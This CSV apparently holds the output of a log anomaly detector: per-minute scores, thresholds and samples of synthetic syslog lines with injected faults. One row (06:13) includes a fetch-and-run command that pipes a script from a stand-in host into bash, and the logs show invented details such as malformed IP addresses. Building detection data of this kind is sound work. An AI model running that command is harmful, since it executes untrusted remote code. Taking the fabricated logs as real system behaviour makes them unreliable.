bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 04:44:00,0.9993089691282538,1,1,0.8224995273096307,3,60,redis-server: Listening on LVM2 poll daemon socket. || redis-server: Rotating log files. || ftpd: Finished Daily apt download activities. || ntpd: Started Cleanup of Temporary Directories. || smartd: Started CUPS Scheduler. || gpm: Accepted publickey
2026-07-01 04:45:00,0.9990505328167105,1,1,0.8224995273096307,3,61,docker: Rotating log files. || CRON: Finished Daily apt download activities. || ufw: Accepted publickey for user from 10.0.0.74 port 22 ssh2. || ntpd: Started CUPS Scheduler. || NetworkManager: Listening on LVM2 poll daemon socket. || chronyd: Rotati
2026-07-01 04:46:00,0.9998759528654803,1,1,0.8224995273096307,3,61,rsyslogd: Accepted publickey for user from 10.0.0.225 port 22 ssh2. || ftpd: Accepted publickey for user from 10.0.0.113 port 22 ssh2. || NetworkManager: Started Cleanup of Temporary Directories. || dockerd: Listening on LVM2 poll daemon socket. || r
2026-07-01 04:47:00,0.9999263306929369,1,1,0.8224995273096307,3,60,redis-server: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || dockerd: Finished Daily apt download activities. || ufw: Started CUPS Scheduler. || rsyslogd: Started CUPS Scheduler. || rsyslogd: Listening on LV
2026-07-01 04:48:00,0.9999392203322466,1,1,0.8224995273096307,3,60,NetworkManager: Finished Daily apt download activities. || systemd-timesyncd: Started Session c54 of user root. || named: Started Cleanup of Temporary Directories. || sudo: Listening on LVM2 poll daemon socket. || systemd: Finished Daily apt download
2026-07-01 04:49:00,0.9994060535026953,1,1,0.8224995273096307,3,57,systemd-timesyncd: Started CUPS Scheduler. || systemd: Synced RTC time from system clock. || named: Accepted publickey for user from 10.0.0.83 port 22 ssh2. || systemd: Rotating log files. || ftpd: Finished Daily apt download activities. || chronyd: 
2026-07-01 04:50:00,0.9997342859917374,1,1,0.8224995273096307,3,66,unix_chkpwd: Finished Daily apt download activities. || sshd: Finished Daily apt download activities. || systemd-timesyncd: Rotating log files. || ufw: Rotating log files. || chronyd: Finished Daily apt download activities. || gpm: Started Cleanup of
2026-07-01 04:51:00,0.9994438933913938,1,1,0.8224995273096307,3,65,named: Rotating log files. || kernel: Accepted publickey for user from 10.0.0.198 port 22 ssh2. || gpm: Started CUPS Scheduler. || logrotate: Started CUPS Scheduler. || sshd: Accepted publickey for user from 10.0.0.77 port 22 ssh2. || named: Rotating
2026-07-01 04:52:00,0.9995678904320099,1,1,0.8224995273096307,3,61,NetworkManager: Finished Daily apt download activities. || ntpd: Started Cleanup of Temporary Directories. || cups: Started Cleanup of Temporary Directories. || sudo: Rotating log files. || xinetd: Started Session c87 of user root. || ntpd: Listening
2026-07-01 04:53:00,0.9996155137823413,1,1,0.8224995273096307,3,56,dockerd: Started CUPS Scheduler. || ufw: Listening on LVM2 poll daemon socket. || CRON: Accepted publickey for user from 10.0.0.63 port 22 ssh2. || systemd-timesyncd: Accepted publickey for user from 10.0.0.126 port 22 ssh2. || unattended-upgrades: F
2026-07-01 04:54:00,0.9971474033557601,1,1,0.8224995273096307,3,60,CRON: Started Session c68 of user root. || rsyslogd: Started Session c50 of user root. || unix_chkpwd: Finished Daily apt download activities. || unattended-upgrades: Started Session c74 of user root. || smartd: Listening on LVM2 poll daemon socket. 
2026-07-01 04:55:00,0.9959456812950037,1,1,0.8224995273096307,3,60,telnetd: Started Cleanup of Temporary Directories. || docker: Started Session c35 of user root. || unix_chkpwd: Finished Daily apt download activities. || telnetd: Started Session c249 of user root. || gpm: Rotating log files. || docker: Accepted pub
2026-07-01 04:56:00,0.9982225893053682,1,1,0.8224995273096307,3,63,gpm: Listening on LVM2 poll daemon socket. || sshd: Listening on LVM2 poll daemon socket. || ntpd: Started Session c242 of user root. || xinetd: Started Cleanup of Temporary Directories. || ftpd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.39164 DST=10.0
2026-07-01 04:57:00,0.9982316638770995,1,1,0.8224995273096307,3,58,docker: Started Session c21 of user root. || ftpd: Rotating log files. || redis-server: Finished Daily apt download activities. || named: Synced RTC time from system clock. || CRON: Accepted publickey for user from 10.0.0.72 port 22 ssh2. || chronyd:
2026-07-01 04:58:00,0.9994760298339016,1,1,0.8224995273096307,3,58,xinetd: Started Session c169 of user root. || NetworkManager: Started Cleanup of Temporary Directories. || ufw: Finished Daily apt download activities. || redis-server: Started Cleanup of Temporary Directories. || gpm: Finished Daily apt download act
2026-07-01 04:59:00,0.9999591464452238,1,1,0.8224995273096307,3,61,smartd: Started Session c165 of user root. || dockerd: Rotating log files. || telnetd: Started Session c221 of user root. || telnetd: Synced RTC time from system clock. || chronyd: Started CUPS Scheduler. || unix_chkpwd: Finished Daily apt download a
2026-07-01 05:00:00,0.9999810168060851,1,1,0.8224995273096307,3,60,NetworkManager: Started Session c247 of user root. || docker: Finished Daily apt download activities. || logrotate: Rotating log files. || unix_chkpwd: Synced RTC time from system clock. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || 
2026-07-01 05:01:00,0.9998895063878095,1,1,0.8224995273096307,3,57,dockerd: Finished Daily apt download activities. || dockerd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.15941 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || smartd: Accepted publickey for user from 10.0.0.160 port 22 ssh2. || CRON: Started Session c24
2026-07-01 05:02:00,0.9997338277591502,1,1,0.8224995273096307,3,61,sshd: Started Session c171 of user root. || ftpd: Started Session c13 of user root. || redis-server: Synced RTC time from system clock. || named: Started Cleanup of Temporary Directories. || unix_chkpwd: Listening on LVM2 poll daemon socket. || sudo:
2026-07-01 05:03:00,0.999938318141845,1,1,0.8224995273096307,3,57,telnetd: Started Cleanup of Temporary Directories. || ntpd: Started CUPS Scheduler. || xinetd: Accepted publickey for user from 10.0.0.68 port 22 ssh2. || sudo: Accepted publickey for user from 10.0.0.140 port 22 ssh2. || dockerd: Rotating log files.
2026-07-01 05:04:00,0.999821646793272,1,1,0.8224995273096307,3,66,xinetd: Finished Daily apt download activities. || unattended-upgrades: Finished Daily apt download activities. || dockerd: Started Cleanup of Temporary Directories. || ufw: Started Cleanup of Temporary Directories. || smartd: Started CUPS Scheduler.
2026-07-01 05:05:00,0.9999231087502003,1,1,0.8224995273096307,3,56,smartd: Finished Daily apt download activities. || logrotate: Started Session c201 of user root. || systemd: Started Session c153 of user root. || smartd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.33497 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || 
2026-07-01 05:06:00,0.9999769140178126,1,1,0.8224995273096307,3,57,gpm: Accepted publickey for user from 10.0.0.239 port 22 ssh2. || CRON: Listening on LVM2 poll daemon socket. || telnetd: Listening on LVM2 poll daemon socket. || ftpd: Started Session c3 of user root. || CRON: Started Session c41 of user root. || lo
2026-07-01 05:07:00,0.9999771050683938,1,1,0.8224995273096307,3,56,CRON: Synced RTC time from system clock. || smartd: Started CUPS Scheduler. || xinetd: Started Session c45 of user root. || telnetd: Finished Daily apt download activities. || sudo: Synced RTC time from system clock. || unattended-upgrades: Started C
2026-07-01 05:08:00,0.9999479206391831,1,1,0.8224995273096307,3,62,sudo: Listening on LVM2 poll daemon socket. || cups: Finished Daily apt download activities. || rsyslogd: Synced RTC time from system clock. || ntpd: Finished Daily apt download activities. || unattended-upgrades: Synced RTC time from system clock. |
2026-07-01 05:09:00,0.9999201471744437,1,1,0.8224995273096307,3,58,kernel: Accepted publickey for user from 10.0.0.103 port 22 ssh2. || docker: Started CUPS Scheduler. || chronyd: Listening on LVM2 poll daemon socket. || telnetd: Rotating log files. || NetworkManager: Accepted publickey for user from 10.0.0.123 port
2026-07-01 05:10:00,0.9999655407328828,1,1,0.8224995273096307,3,62,xinetd: Synced RTC time from system clock. || ntpd: Rotating log files. || chronyd: Listening on LVM2 poll daemon socket. || ftpd: Listening on LVM2 poll daemon socket. || chronyd: Synced RTC time from system clock. || smartd: Rotating log files. || 
2026-07-01 05:11:00,0.9999170327990506,1,1,0.8224995273096307,3,59,cups: Started Session c142 of user root. || systemd: Started CUPS Scheduler. || telnetd: Started CUPS Scheduler. || NetworkManager: Started Session c21 of user root. || xinetd: Listening on LVM2 poll daemon socket. || gpm: Started CUPS Scheduler. || 
2026-07-01 05:12:00,0.9999643894851012,1,1,0.8224995273096307,3,58,chronyd: Listening on LVM2 poll daemon socket. || ufw: Rotating log files. || docker: Accepted publickey for user from 10.0.0.42 port 22 ssh2. || ntpd: Accepted publickey for user from 10.0.0.204 port 22 ssh2. || kernel: Started CUPS Scheduler. || uf
2026-07-01 05:13:00,0.9994674005687003,1,1,0.8224995273096307,3,59,ntpd: Synced RTC time from system clock. || redis-server: Accepted publickey for user from 10.0.0.246 port 22 ssh2. || xinetd: Started CUPS Scheduler. || redis-server: Accepted publickey for user from 10.0.0.145 port 22 ssh2. || ftpd: Listening on LV
2026-07-01 05:14:00,0.9936360996198259,1,1,0.8224995273096307,3,59,unix_chkpwd: Started Session c241 of user root. || xinetd: Rotating log files. || redis-server: Finished Daily apt download activities. || gpm: Failed password for invalid user test from 192.168.1.28988 port 22 ssh2 || systemd-timesyncd: Started CUPS
2026-07-01 05:15:00,0.987022763074069,1,1,0.8224995273096307,3,59,systemd-timesyncd: Started Session c111 of user root. || ftpd: Synced RTC time from system clock. || docker: kernel: Kernel panic - not syncing: Fatal exception || logrotate: Started Session c209 of user root. || smartd: Started Session c111 of user 
2026-07-01 05:16:00,0.9988956314216605,1,1,0.8224995273096307,3,61,redis-server: Listening on LVM2 poll daemon socket. || named: Synced RTC time from system clock. || sudo: Synced RTC time from system clock. || telnetd: Started CUPS Scheduler. || chronyd: Started CUPS Scheduler. || ntpd: Started CUPS Scheduler. || N
2026-07-01 05:17:00,0.999745993948015,1,1,0.8224995273096307,3,66,unattended-upgrades: Listening on LVM2 poll daemon socket. || redis-server: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started Session c39 of user root. || gpm: Started Cleanup of Temporary Directories. || rsyslogd: kernel: Out of memory: 
2026-07-01 05:18:00,0.9997625869151002,1,1,0.8224995273096307,3,61,systemd: Listening on LVM2 poll daemon socket. || ufw: Rotating log files. || unix_chkpwd: Rotating log files. || systemd: Rotating log files. || chronyd: Listening on LVM2 poll daemon socket. || redis-server: Rotating log files. || logrotate: Finish
2026-07-01 05:19:00,0.9994008824113643,1,1,0.8224995273096307,3,59,xinetd: Started Session c185 of user root. || CRON: Started Cleanup of Temporary Directories. || unattended-upgrades: Started CUPS Scheduler. || docker: Started Session c3 of user root. || sshd: Started Cleanup of Temporary Directories. || smartd: Ac
2026-07-01 05:20:00,0.9999003177037018,1,1,0.8224995273096307,3,62,logrotate: Finished Daily apt download activities. || docker: Synced RTC time from system clock. || NetworkManager: Started CUPS Scheduler. || cups: Started Session c168 of user root. || chronyd: Accepted publickey for user from 10.0.0.113 port 22 ss
2026-07-01 05:21:00,0.9991690928196476,1,1,0.8224995273096307,3,60,logrotate: Listening on LVM2 poll daemon socket. || CRON: Started Session c180 of user root. || CRON: Accepted publickey for user from 10.0.0.125 port 22 ssh2. || redis-server: Synced RTC time from system clock. || smartd: Started Cleanup of Temporar
2026-07-01 05:22:00,0.9786986330676528,1,1,0.8224995273096307,3,57,logrotate: Started Session c219 of user root. || smartd: Accepted publickey for user from 10.0.0.208 port 22 ssh2. || telnetd: Accepted publickey for user from 10.0.0.144 port 22 ssh2. || gpm: Started Session c130 of user root. || sudo: Finished Dail
2026-07-01 05:23:00,0.9966837568962957,1,1,0.8224995273096307,3,58,rsyslogd: Finished Daily apt download activities. || ftpd: Synced RTC time from system clock. || rsyslogd: Listening on LVM2 poll daemon socket. || dockerd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started Cleanup of Temporary Directorie
2026-07-01 05:24:00,0.9988567745600347,1,1,0.8224995273096307,3,59,chronyd: Finished Daily apt download activities. || named: Accepted publickey for user from 10.0.0.77 port 22 ssh2. || redis-server: Synced RTC time from system clock. || unix_chkpwd: Synced RTC time from system clock. || kernel: Started Cleanup of T
2026-07-01 05:25:00,0.9985910465481739,1,1,0.8224995273096307,3,59,logrotate: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || systemd: Started CUPS Scheduler. || chronyd: Listening on LVM2 poll daemon socket. || named: Listening on LVM2 poll daemon socket. || rsyslogd: Liste
2026-07-01 05:26:00,0.9991970337316859,1,1,0.8224995273096307,3,60,kernel: Started Session c210 of user root. || systemd: Finished Daily apt download activities. || unix_chkpwd: Rotating log files. || telnetd: Rotating log files. || named: Synced RTC time from system clock. || ftpd: Synced RTC time from system clock
2026-07-01 05:27:00,0.9993945584268863,1,1,0.8224995273096307,3,57,CRON: Started Session c16 of user root. || gpm: Accepted publickey for user from 10.0.0.58 port 22 ssh2. || ufw: Accepted publickey for user from 10.0.0.159 port 22 ssh2. || docker: Started Session c223 of user root. || named: Accepted publickey for 
2026-07-01 05:28:00,0.9980342291054971,1,1,0.8224995273096307,3,64,ntpd: Finished Daily apt download activities. || ntpd: Started Session c226 of user root. || cups: Started Cleanup of Temporary Directories. || sshd: Listening on LVM2 poll daemon socket. || ufw: Started Cleanup of Temporary Directories. || gpm: Star
2026-07-01 05:29:00,0.9929281779435548,1,1,0.8224995273096307,3,59,telnetd: Started Session c33 of user root. || cups: Accepted publickey for user from 10.0.0.204 port 22 ssh2. || dockerd: Started Cleanup of Temporary Directories. || rsyslogd: Accepted publickey for user from 10.0.0.20 port 22 ssh2. || ufw: Started 
2026-07-01 05:30:00,0.9993326632918935,1,1,0.8224995273096307,3,59,dockerd: Started Session c66 of user root. || unix_chkpwd: Finished Daily apt download activities. || ufw: Synced RTC time from system clock. || docker: Listening on LVM2 poll daemon socket. || rsyslogd: Finished Daily apt download activities. || sud
2026-07-01 05:31:00,0.9998176339976139,1,1,0.8224995273096307,3,60,docker: Finished Daily apt download activities. || ntpd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started CUPS Scheduler. || NetworkManager: Rotating log files. || unattended-upgrades: Accepted publickey for user from 10.0.0.170 port 22 
2026-07-01 05:32:00,0.9995772651855862,1,1,0.8224995273096307,3,59,unix_chkpwd: Started Session c16 of user root. || ntpd: Started Cleanup of Temporary Directories. || unix_chkpwd: Started Cleanup of Temporary Directories. || docker: Rotating log files. || redis-server: Synced RTC time from system clock. || CRON: Ac
2026-07-01 05:33:00,0.9985871816750257,1,1,0.8224995273096307,3,58,logrotate: Rotating log files. || smartd: Started CUPS Scheduler. || CRON: Synced RTC time from system clock. || unix_chkpwd: Started CUPS Scheduler. || gpm: Started Cleanup of Temporary Directories. || ftpd: Started Cleanup of Temporary Directories.
2026-07-01 05:34:00,0.9997809323727134,1,1,0.8224995273096307,3,58,dockerd: Started Cleanup of Temporary Directories. || rsyslogd: Started CUPS Scheduler. || sshd: Started CUPS Scheduler. || sudo: Started CUPS Scheduler. || kernel: Started Session c123 of user root. || ufw: Synced RTC time from system clock. || unix
2026-07-01 05:35:00,0.9993574576371008,1,1,0.8224995273096307,3,62,named: Started Cleanup of Temporary Directories. || unix_chkpwd: Rotating log files. || ufw: Started CUPS Scheduler. || ntpd: Started CUPS Scheduler. || ufw: Listening on LVM2 poll daemon socket. || sudo: Started Session c120 of user root. || logrota
2026-07-01 05:36:00,0.999777490247467,1,1,0.8224995273096307,3,60,NetworkManager: Rotating log files. || docker: Started Cleanup of Temporary Directories. || smartd: Accepted publickey for user from 10.0.0.29 port 22 ssh2. || ntpd: Listening on LVM2 poll daemon socket. || xinetd: Synced RTC time from system clock. 
2026-07-01 05:37:00,0.9996238089419152,1,1,0.8224995273096307,3,59,ufw: Finished Daily apt download activities. || NetworkManager: Started Session c20 of user root. || docker: Started Cleanup of Temporary Directories. || ftpd: Accepted publickey for user from 10.0.0.144 port 22 ssh2. || CRON: Accepted publickey for 
2026-07-01 05:38:00,0.9997429316598035,1,1,0.8224995273096307,3,61,rsyslogd: kernel: Kernel panic - not syncing: Fatal exception || CRON: Started CUPS Scheduler. || cups: Started Cleanup of Temporary Directories. || ftpd: Started Session c9 of user root. || smartd: Started Cleanup of Temporary Directories. || rsyslo
2026-07-01 05:39:00,0.9997696430978994,1,1,0.8224995273096307,3,62,dockerd: Synced RTC time from system clock. || systemd-timesyncd: Started Cleanup of Temporary Directories. || docker: Finished Daily apt download activities. || logrotate: Accepted publickey for user from 10.0.0.248 port 22 ssh2. || systemd-timesync
2026-07-01 05:40:00,0.9996272008766068,1,1,0.8224995273096307,3,61,xinetd: Accepted publickey for user from 10.0.0.7 port 22 ssh2. || sshd: Finished Daily apt download activities. || unattended-upgrades: Synced RTC time from system clock. || dockerd: Started Cleanup of Temporary Directories. || docker: Rotating log 
2026-07-01 05:41:00,0.9998817614607534,1,1,0.8224995273096307,3,59,xinetd: Rotating log files. || named: Started Cleanup of Temporary Directories. || ftpd: Synced RTC time from system clock. || docker: Synced RTC time from system clock. || rsyslogd: Accepted publickey for user from 10.0.0.243 port 22 ssh2. || sudo: 
2026-07-01 05:42:00,0.9992936633000579,1,1,0.8224995273096307,3,59,smartd: Started CUPS Scheduler. || gpm: Rotating log files. || xinetd: Started CUPS Scheduler. || smartd: Started Session c72 of user root. || unix_chkpwd: Started CUPS Scheduler. || kernel: Started Session c251 of user root. || unattended-upgrades: 
2026-07-01 05:43:00,0.9992438809789533,1,1,0.8224995273096307,3,58,telnetd: Rotating log files. || systemd-timesyncd: Rotating log files. || telnetd: Finished Daily apt download activities. || dockerd: Listening on LVM2 poll daemon socket. || rsyslogd: Rotating log files. || rsyslogd: Started Cleanup of Temporary Di
2026-07-01 05:44:00,0.9997473946634613,1,1,0.8224995273096307,3,60,xinetd: Started Cleanup of Temporary Directories. || chronyd: Accepted publickey for user from 10.0.0.111 port 22 ssh2. || redis-server: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Failed password for invalid user test from 192.168.1.
2026-07-01 05:45:00,0.9994058146154521,1,1,0.8224995273096307,3,56,gpm: Started Cleanup of Temporary Directories. || docker: Accepted publickey for user from 10.0.0.194 port 22 ssh2. || redis-server: Finished Daily apt download activities. || systemd-timesyncd: Rotating log files. || named: Accepted publickey for us
2026-07-01 05:46:00,0.9994972308056248,1,1,0.8224995273096307,3,57,rsyslogd: Listening on LVM2 poll daemon socket. || ftpd: Accepted publickey for user from 10.0.0.235 port 22 ssh2. || dockerd: Started Cleanup of Temporary Directories. || systemd: Started Cleanup of Temporary Directories. || telnetd: Finished Daily 
2026-07-01 05:47:00,0.9992262635314946,1,1,0.8224995273096307,3,59,logrotate: Listening on LVM2 poll daemon socket. || ntpd: Rotating log files. || unix_chkpwd: Rotating log files. || smartd: Started Cleanup of Temporary Directories. || named: Accepted publickey for user from 10.0.0.237 port 22 ssh2. || ufw: Rotatin
2026-07-01 05:48:00,0.9962758066992967,1,1,0.8224995273096307,3,57,docker: Started Session c25 of user root. || ftpd: Finished Daily apt download activities. || unattended-upgrades: Accepted publickey for user from 10.0.0.60 port 22 ssh2. || chronyd: Listening on LVM2 poll daemon socket. || docker: Rotating log file
2026-07-01 05:49:00,0.9986272472008021,1,1,0.8224995273096307,3,57,named: Started CUPS Scheduler. || cups: Started Session c119 of user root. || NetworkManager: Started Cleanup of Temporary Directories. || ftpd: Started Cleanup of Temporary Directories. || ntpd: Started Cleanup of Temporary Directories. || CRON: Syn
2026-07-01 05:50:00,0.9996304844375651,1,1,0.8224995273096307,3,62,dockerd: Started Cleanup of Temporary Directories. || dockerd: Synced RTC time from system clock. || ftpd: Started CUPS Scheduler. || sudo: Rotating log files. || cups: Rotating log files. || NetworkManager: Started Cleanup of Temporary Directories. 
2026-07-01 05:51:00,0.9986650181444002,1,1,0.8224995273096307,3,64,cups: Synced RTC time from system clock. || unattended-upgrades: Rotating log files. || NetworkManager: Started CUPS Scheduler. || smartd: Finished Daily apt download activities. || chronyd: Rotating log files. || ufw: Listening on LVM2 poll daemon s
2026-07-01 05:52:00,0.9989392423699578,1,1,0.8224995273096307,3,63,gpm: Finished Daily apt download activities. || xinetd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Finished Daily apt download activities. || xinetd: Listening on LVM2 poll daemon socket. || docker: Started Session c30 of user root
2026-07-01 05:53:00,0.9992382573396722,1,1,0.8224995273096307,3,59,redis-server: Started Cleanup of Temporary Directories. || unix_chkpwd: Accepted publickey for user from 10.0.0.6 port 22 ssh2. || ntpd: Started CUPS Scheduler. || ntpd: Listening on LVM2 poll daemon socket. || CRON: Finished Daily apt download activ
2026-07-01 05:54:00,0.9914661693195609,1,1,0.8224995273096307,3,63,named: Rotating log files. || smartd: Rotating log files. || CRON: Rotating log files. || ntpd: Started CUPS Scheduler. || dockerd: Started Cleanup of Temporary Directories. || sshd: Synced RTC time from system clock. || chronyd: Listening on LVM2 po
2026-07-01 05:55:00,0.9888168342525652,1,1,0.8224995273096307,3,58,unattended-upgrades: Finished Daily apt download activities. || unattended-upgrades: Synced RTC time from system clock. || CRON: Finished Daily apt download activities. || logrotate: kernel: Kernel panic - not syncing: Fatal exception || ufw: Started
2026-07-01 05:56:00,0.9959553730102084,1,1,0.8224995273096307,3,59,ftpd: Finished Daily apt download activities. || logrotate: Started Cleanup of Temporary Directories. || xinetd: Finished Daily apt download activities. || CRON: Started CUPS Scheduler. || gpm: Started Cleanup of Temporary Directories. || cups: Start
2026-07-01 05:57:00,0.9988432608138534,1,1,0.8224995273096307,3,59,docker: Listening on LVM2 poll daemon socket. || rsyslogd: Synced RTC time from system clock. || gpm: Finished Daily apt download activities. || rsyslogd: Started Cleanup of Temporary Directories. || telnetd: Listening on LVM2 poll daemon socket. || 
2026-07-01 05:58:00,0.999866918287803,1,1,0.8224995273096307,3,60,redis-server: Synced RTC time from system clock. || CRON: Rotating log files. || ftpd: Synced RTC time from system clock. || kernel: Started Cleanup of Temporary Directories. || rsyslogd: Started CUPS Scheduler. || systemd-timesyncd: Started Session 
2026-07-01 05:59:00,0.9999620229857488,1,1,0.8224995273096307,3,59,kernel: Listening on LVM2 poll daemon socket. || smartd: Rotating log files. || NetworkManager: Started Session c82 of user root. || kernel: Listening on LVM2 poll daemon socket. || xinetd: Accepted publickey for user from 10.0.0.247 port 22 ssh2. ||
2026-07-01 06:00:00,0.9999896468599428,1,1,0.8224995273096307,3,57,dockerd: Rotating log files. || systemd-timesyncd: Synced RTC time from system clock. || systemd: Listening on LVM2 poll daemon socket. || rsyslogd: Rotating log files. || unix_chkpwd: Started Cleanup of Temporary Directories. || logrotate: Rotating 
2026-07-01 06:01:00,0.9999986069416399,1,1,0.8224995273096307,3,61,chronyd: kernel: Kernel panic - not syncing: Fatal exception || redis-server: Accepted publickey for user from 10.0.0.169 port 22 ssh2. || rsyslogd: Started Cleanup of Temporary Directories. || sshd: Started CUPS Scheduler. || dockerd: Finished Daily
2026-07-01 06:02:00,0.9999601585587764,1,1,0.8224995273096307,3,60,sudo: Started Cleanup of Temporary Directories. || ufw: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.60653 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || rsyslogd: Started CUPS Scheduler. || smartd: Started CUPS Scheduler. || chronyd: Started CUPS Sched
2026-07-01 06:03:00,0.999847481061569,1,1,0.8224995273096307,3,58,telnetd: Finished Daily apt download activities. || rsyslogd: Started CUPS Scheduler. || named: Rotating log files. || telnetd: Listening on LVM2 poll daemon socket. || docker: Accepted publickey for user from 10.0.0.82 port 22 ssh2. || named: Starte
2026-07-01 06:04:00,0.9999860082996536,1,1,0.8224995273096307,3,59,CRON: Started Cleanup of Temporary Directories. || dockerd: Rotating log files. || xinetd: Listening on LVM2 poll daemon socket. || docker: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.49789 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || cups: Finished 
2026-07-01 06:05:00,0.9999449798473671,1,1,0.8224995273096307,3,57,unix_chkpwd: Started Session c49 of user root. || kernel: Synced RTC time from system clock. || NetworkManager: Rotating log files. || cups: kernel: Kernel panic - not syncing: Fatal exception || smartd: Rotating log files. || sshd: Started Cleanup o
2026-07-01 06:06:00,0.9999766477444473,1,1,0.8224995273096307,3,61,gpm: Listening on LVM2 poll daemon socket. || unattended-upgrades: Finished Daily apt download activities. || chronyd: Accepted publickey for user from 10.0.0.22 port 22 ssh2. || docker: Accepted publickey for user from 10.0.0.190 port 22 ssh2. || sy
2026-07-01 06:07:00,0.999776837207995,1,1,0.8224995273096307,3,58,kernel: Accepted publickey for user from 10.0.0.225 port 22 ssh2. || cups: Finished Daily apt download activities. || gpm: Synced RTC time from system clock. || ntpd: Started Session c208 of user root. || chronyd: Finished Daily apt download activiti
2026-07-01 06:08:00,0.9992787489209098,1,1,0.8224995273096307,3,54,redis-server: Accepted publickey for user from 10.0.0.167 port 22 ssh2. || chronyd: Finished Daily apt download activities. || sudo: Started CUPS Scheduler. || systemd-timesyncd: Rotating log files. || unix_chkpwd: Rotating log files. || NetworkManag
2026-07-01 06:09:00,0.9995500862794027,1,1,0.8224995273096307,3,59,kernel: Listening on LVM2 poll daemon socket. || ufw: Finished Daily apt download activities. || redis-server: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || logrotate: Synced RTC time from system clock. || 
2026-07-01 06:10:00,0.9995273589341331,1,1,0.8224995273096307,3,59,ntpd: Started CUPS Scheduler. || systemd: Started Cleanup of Temporary Directories. || kernel: Finished Daily apt download activities. || dockerd: Accepted publickey for user from 10.0.0.40 port 22 ssh2. || NetworkManager: Started Session c143 of use
2026-07-01 06:11:00,0.9999337052686532,1,1,0.8224995273096307,3,64,chronyd: Rotating log files. || docker: Accepted publickey for user from 10.0.0.243 port 22 ssh2. || chronyd: Started CUPS Scheduler. || ftpd: Started CUPS Scheduler. || dockerd: Started Cleanup of Temporary Directories. || systemd-timesyncd: Accepte
2026-07-01 06:12:00,0.9982388838638023,1,1,0.8224995273096307,3,61,ufw: Synced RTC time from system clock. || dockerd: Synced RTC time from system clock. || docker: Started Cleanup of Temporary Directories. || systemd: Started Cleanup of Temporary Directories. || cups: Finished Daily apt download activities. || CRON
2026-07-01 06:13:00,0.9983148533995998,1,1,0.8224995273096307,3,63,dockerd: Started Session c112 of user root. || ftpd: Rotating log files. || cups: bash: -c: line 1: curl http://bad.site/payload.sh | bash || rsyslogd: Rotating log files. || docker: Rotating log files. || telnetd: Rotating log files. || unattended-u
2026-07-01 06:14:00,0.9983332569835314,1,1,0.8224995273096307,3,59,NetworkManager: Synced RTC time from system clock. || gpm: Accepted publickey for user from 10.0.0.163 port 22 ssh2. || ufw: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || unattended-upgrades: kern
2026-07-01 06:15:00,0.9994681212144864,1,1,0.8224995273096307,3,61,ntpd: Started CUPS Scheduler. || ftpd: Rotating log files. || ntpd: Started Session c244 of user root. || sshd: Started CUPS Scheduler. || docker: Started Cleanup of Temporary Directories. || chronyd: app[1234]: segfault at 0 ip 00007f stackpointer e
2026-07-01 06:16:00,0.9994840092717628,1,1,0.8224995273096307,3,61,NetworkManager: Listening on LVM2 poll daemon socket. || CRON: Rotating log files. || ftpd: Synced RTC time from system clock. || redis-server: Listening on LVM2 poll daemon socket. || dockerd: Rotating log files. || docker: Started Cleanup of Tempor
2026-07-01 06:17:00,0.9999458020338886,1,1,0.8224995273096307,3,61,sshd: Rotating log files. || ntpd: Synced RTC time from system clock. || systemd-timesyncd: Synced RTC time from system clock. || chronyd: Finished Daily apt download activities. || kernel: Accepted publickey for user from 10.0.0.57 port 22 ssh2. || 
